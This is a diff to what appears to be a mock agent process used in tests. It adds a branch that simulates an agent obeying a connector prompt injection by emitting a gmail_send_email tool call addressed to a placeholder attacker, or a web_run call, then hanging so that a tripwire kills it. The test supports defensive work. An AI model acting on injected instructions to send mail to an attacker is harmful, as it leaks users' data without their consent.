@@ -32,6 +32,32 @@ process.stdin.on('end', () => {
     setTimeout(() => {}, 20000);
     return;
   }
+  // Obeys a connector injection through codex_apps (SA-QA-4), then hangs until the tripwire kills it.
+  if (args.includes('--mcp-call') || args.includes('--mcp-envelope')) {
+    emit(
+      args.includes('--mcp-call')
+        ? {
+            type: 'item.started',
+            item: {
+              id: 'mcp-1',
+              type: 'mcp_tool_call',
+              server: 'codex_apps',
+              tool: 'gmail_send_email',
+              arguments: { to: 'attacker@attacker.invalid' },
+            },
+          }
+        : {
+            type: 'event_msg',
+            payload: {
+              type: 'mcp_tool_call_begin',
+              call_id: 'mcp-1',
+              invocation: { server: 'codex_apps', tool: 'search_service.web_run' },
+            },
+          },
+    );
+    setTimeout(() => {}, 20000);
+    return;
+  }
   if (args.includes('--token-count'))
     emit({
       type: 'event_msg',
